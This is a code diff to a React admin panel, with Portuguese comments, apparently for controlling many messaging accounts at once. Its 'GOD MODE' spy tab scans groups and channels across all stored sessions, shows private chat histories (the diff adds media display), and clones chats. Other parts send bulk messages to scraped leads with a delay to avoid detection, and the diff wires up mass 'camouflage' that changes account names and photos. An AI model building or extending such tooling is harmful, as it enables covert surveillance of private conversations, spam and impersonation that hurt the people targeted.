@@ -20,7 +20,7 @@ export default function AdminPanel() {
   const [allChannels, setAllChannels] = useState([]);
   const [isScanning, setIsScanning] = useState(false);
   const [scanProgress, setScanProgress] = useState(0);
-  const [filterNumber, setFilterNumber] = useState(''); // Filtro por número
+  const [filterNumber, setFilterNumber] = useState('');
 
   // Estados de Chat e Visualização
   const [viewingChat, setViewingChat] = useState(null);
@@ -35,7 +35,7 @@ export default function AdminPanel() {
 
   // --- INICIALIZAÇÃO ---
   useEffect(() => {
-    // Tenta recuperar dados salvos no navegador para não precisar escanear sempre
+    // Tenta recuperar dados salvos
     const savedGroups = localStorage.getItem('godModeGroups');
     const savedChannels = localStorage.getItem('godModeChannels');
     if (savedGroups) setAllGroups(JSON.parse(savedGroups));
@@ -99,7 +99,7 @@ export default function AdminPanel() {
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({ senderPhone: sender, target: leads[i].user_id, message: msg, leadDbId: leads[i].id })
              });
-             await new Promise(r => setTimeout(r, 2000)); // Delay de segurança
+             await new Promise(r => setTimeout(r, 2000));
          }
          addLog('✅ Campanha finalizada.'); fetchData();
      } catch (e) { addLog(`Erro: ${e.message}`); }
@@ -123,7 +123,6 @@ export default function AdminPanel() {
 
       for (let i = 0; i < sessions.length; i++) {
           const phone = sessions[i].phone_number;
-          // Atualiza progresso visual
           setScanProgress(Math.round(((i + 1) / sessions.length) * 100));
           
           try {
@@ -144,23 +143,20 @@ export default function AdminPanel() {
           } catch (e) { console.error(`Erro ao ler ${phone}`); }
       }
 
-      // Remove duplicatas (mesmo grupo em várias contas)
       const uniqueGroups = [...new Map(groups.map(item => [item.id, item])).values()];
       const uniqueChannels = [...new Map(channels.map(item => [item.id, item])).values()];
 
-      // Ordena por tamanho (maiores primeiro)
       uniqueGroups.sort((a,b) => b.participantsCount - a.participantsCount);
       uniqueChannels.sort((a,b) => b.participantsCount - a.participantsCount);
 
       setAllGroups(uniqueGroups);
       setAllChannels(uniqueChannels);
       
-      // SALVA NO NAVEGADOR (PERSISTÊNCIA SIMPLES)
       localStorage.setItem('godModeGroups', JSON.stringify(uniqueGroups));
       localStorage.setItem('godModeChannels', JSON.stringify(uniqueChannels));
 
       setIsScanning(false);
-      alert(`Varredura completa! ${uniqueGroups.length} Grupos e ${uniqueChannels.length} Canais encontrados.`);
+      alert(`Varredura completa! ${uniqueGroups.length} Grupos e ${uniqueChannels.length} Canais.`);
   };
 
   // --- AÇÕES DO ESPIÃO ---
@@ -200,7 +196,7 @@ export default function AdminPanel() {
       
       if(data.success) {
           addLog(`✅ ${data.message}`);
-          fetchData(); // Atualiza contador de leads
+          fetchData(); 
       } else {
           addLog(`❌ Erro: ${data.error}`);
           alert(`Erro: ${data.error}`);
@@ -217,17 +213,20 @@ export default function AdminPanel() {
       if(res.ok) addLog(`✅ Clonagem de ${chat.title} iniciada.`);
       else addLog('❌ Erro na clonagem.');
   };
-
-  // --- FILTRO ---
-  const filteredGroups = filterNumber 
-    ? allGroups.filter(g => g.ownerPhone.includes(filterNumber)) 
-    : allGroups;
     
-  const filteredChannels = filterNumber 
-    ? allChannels.filter(c => c.ownerPhone.includes(filterNumber)) 
-    : allChannels;
+  const handleUpdateProfile = async () => {
+    if (selectedPhones.size === 0) return alert('Selecione contas!');
+    setProcessing(true);
+    for (const phone of Array.from(selectedPhones)) {
+        addLog(`🎭 Atualizando ${phone}...`);
+        await fetch('/api/update-profile', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ phone, newName, photoUrl }) });
+    }
+    setProcessing(false); addLog('✅ Feito.');
+  };
 
-  // Renderização
+  const filteredGroups = filterNumber ? allGroups.filter(g => g.ownerPhone.includes(filterNumber)) : allGroups;
+  const filteredChannels = filterNumber ? allChannels.filter(c => c.ownerPhone.includes(filterNumber)) : allChannels;
+
   if (!isAuthenticated) return (
       <div style={{height:'100vh', background:'#000', display:'flex', alignItems:'center', justifyContent:'center'}}>
           <form onSubmit={handleLogin}><input type="password" value={passwordInput} onChange={e=>setPasswordInput(e.target.value)} placeholder="Senha Admin" style={{padding:'10px', borderRadius:'5px'}}/></form>
@@ -249,13 +248,20 @@ export default function AdminPanel() {
                         <button onClick={()=>setViewingChat(null)} style={{background:'none', border:'none', color:'red', fontSize:'20px', cursor:'pointer'}}>✖</button>
                     </div>
                     <div style={{flex:1, overflowY:'auto', padding:'15px', display:'flex', flexDirection:'column', gap:'10px'}}>
-                        {loadingHistory ? <p style={{textAlign:'center'}}>Carregando...</p> : 
+                        {loadingHistory ? <p style={{textAlign:'center'}}>Carregando (com mídia)...</p> : 
                             chatHistory.length === 0 ? <p style={{textAlign:'center'}}>Histórico vazio.</p> :
                             chatHistory.map((m, i) => (
                                 <div key={i} style={{alignSelf: m.isOut ? 'flex-end' : 'flex-start', background: m.isOut ? '#238636' : '#30363d', padding:'10px', borderRadius:'8px', maxWidth:'80%'}}>
-                                    <div style={{fontSize:'10px', opacity:0.7, marginBottom:'2px'}}>{m.sender} • {new Date(m.date * 1000).toLocaleTimeString()}</div>
+                                    <div style={{fontSize:'10px', opacity:0.7, marginBottom:'2px'}}>{m.sender}</div>
+                                    
+                                    {/* MÍDIA */}
+                                    {m.media && (
+                                        <div style={{marginBottom:'5px'}}>
+                                            <img src={m.media} alt="Mídia" style={{maxWidth:'100%', borderRadius:'5px'}} />
+                                        </div>
+                                    )}
+
                                     <div style={{color:'white'}}>{m.text}</div>
-                                    {m.hasMedia && <div style={{fontSize:'10px', color:'#58a6ff', marginTop:'5px'}}>📷 Mídia Anexada</div>}
                                 </div>
                             ))
                         }
@@ -264,21 +270,19 @@ export default function AdminPanel() {
             </div>
         )}
 
-        {/* MENU SUPERIOR */}
         <div style={{marginBottom:'20px', borderBottom:'1px solid #30363d', paddingBottom:'10px'}}>
             <button onClick={()=>setTab('spy')} style={{marginRight:'10px', padding:'10px 20px', background: tab==='spy'?'#8957e5':'transparent', border:'1px solid #8957e5', color:'white', borderRadius:'5px', cursor:'pointer'}}>👁️ GOD MODE</button>
             <button onClick={()=>setTab('dashboard')} style={{marginRight:'10px', padding:'10px 20px', background: tab==='dashboard'?'#238636':'transparent', border:'1px solid #238636', color:'white', borderRadius:'5px', cursor:'pointer'}}>🚀 DASHBOARD</button>
             <button onClick={()=>setTab('tools')} style={{padding:'10px 20px', background: tab==='tools'?'#1f6feb':'transparent', border:'1px solid #1f6feb', color:'white', borderRadius:'5px', cursor:'pointer'}}>🛠️ TOOLS</button>
         </div>
 
-        {/* CONTEÚDO */}
         {tab === 'spy' && (
             <div>
                 <div style={{display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'20px', background:'#161b22', padding:'15px', borderRadius:'8px'}}>
                     <div>
                         <h2 style={{margin:0, color:'white'}}>Radar Global ({sessions.length} contas)</h2>
                         <div style={{fontSize:'12px', color:'#8b949e'}}>
-                            Total Mapeado: {allGroups.length} Grupos | {allChannels.length} Canais
+                            {allGroups.length} Grupos | {allChannels.length} Canais
                         </div>
                     </div>
                     <div style={{display:'flex', gap:'10px'}}>
@@ -296,8 +300,6 @@ export default function AdminPanel() {
                 </div>
 
                 <div style={{display:'grid', gridTemplateColumns:'1fr 1fr', gap:'20px'}}>
-                    
-                    {/* COLUNA GRUPOS */}
                     <div style={{background:'#161b22', padding:'15px', borderRadius:'8px'}}>
                         <h3 style={{color:'#d29922', borderBottom:'1px solid #30363d', paddingBottom:'10px', marginTop:0}}>👥 GRUPOS ({filteredGroups.length})</h3>
                         <div style={{maxHeight:'70vh', overflowY:'auto'}}>
@@ -317,7 +319,6 @@ export default function AdminPanel() {
                         </div>
                     </div>
 
-                    {/* COLUNA CANAIS */}
                     <div style={{background:'#161b22', padding:'15px', borderRadius:'8px'}}>
                         <h3 style={{color:'#3390ec', borderBottom:'1px solid #30363d', paddingBottom:'10px', marginTop:0}}>📢 CANAIS ({filteredChannels.length})</h3>
                         <div style={{maxHeight:'70vh', overflowY:'auto'}}>
@@ -337,12 +338,10 @@ export default function AdminPanel() {
                             ))}
                         </div>
                     </div>
-
                 </div>
             </div>
         )}
 
-        {/* OUTRAS TABS (Mantidas iguais para não quebrar) */}
         {tab === 'dashboard' && (
             <div style={{background:'#161b22', padding:'20px', borderRadius:'8px'}}>
                 <div style={{display:'flex', gap:'20px', marginBottom:'20px'}}>
@@ -370,13 +369,13 @@ export default function AdminPanel() {
                 </div>
             </div>
         )}
-
+        
         {tab === 'tools' && (
              <div style={{ backgroundColor: '#161b22', padding: '20px' }}>
                 <h3>🎭 Camuflagem em Massa</h3>
                 <input type="text" placeholder="Nome" value={newName} onChange={e => setNewName(e.target.value)} style={{ width: '100%', marginBottom: '10px', padding: '10px', background: '#0d1117', border: '1px solid #30363d', color: 'white' }} />
                 <input type="text" placeholder="Foto URL" value={photoUrl} onChange={e => setPhotoUrl(e.target.value)} style={{ width: '100%', marginBottom: '10px', padding: '10px', background: '#0d1117', border: '1px solid #30363d', color: 'white' }} />
-                <button style={{ width: '100%', padding: '10px', background: '#8957e5', color: 'white', border: 'none' }}>ATUALIZAR PERFIS (Implementado na API)</button>
+                <button onClick={handleUpdateProfile} style={{ width: '100%', padding: '10px', background: '#8957e5', color: 'white', border: 'none' }}>ATUALIZAR PERFIS</button>
             </div>
         )}
     </div>
